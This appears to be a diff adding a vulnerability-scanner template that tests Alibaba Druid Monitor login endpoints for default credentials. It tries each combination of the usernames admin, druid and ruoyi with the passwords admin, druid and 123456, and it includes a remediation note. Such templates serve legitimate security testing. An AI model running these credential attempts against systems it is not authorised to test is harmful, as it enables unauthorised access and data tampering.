@@ -1,0 +1,50 @@
+id: alibaba-druid-default-login
+
+info:
+  name: Alibaba Druid Monitor - Default Login
+  author: pikpikcu,leadlife
+  severity: high
+  description: Alibaba Druid是一款常用的数据库连接池组件。然而，如果其使用默认密码或者过于简单的弱口令，就可能存在弱口令漏洞。这个漏洞可能被恶意攻击者利用，进行未授权的访问和可能的数据篡改。
+  metadata:
+    verified: true
+    repair: 修改弱口令：修改管理员用户密码，以一个强密码来替代。确保密码足够复杂，包括字母、数字和特殊字符，且不要使用易于猜测的密码。
+  tags: druid,alibaba,default-login,alibaba-druid
+
+http:
+  - raw:
+      - |
+        POST /druid/submitLogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        loginUsername={{username}}&loginPassword={{password}}
+
+      - |+
+        POST /submitLogin HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        loginUsername={{username}}&loginPassword={{password}}
+
+    payloads:
+      username:
+        - admin
+        - druid
+        - ruoyi
+      password:
+        - admin
+        - druid
+        - 123456
+    attack: clusterbomb
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: regex
+        regex:
+          - "^success$"
+
+# digest: 4a0a0047304502203dfdfa52e3c78cf6b97da6c9696cbd67765e254ee413a412325e57b4cd454ef0022100d443785f6f2d4979660305541336a2f74f56b2c5efacb43b07928e7831b0bc03:922c64590222798bb761d5b6d8e72950
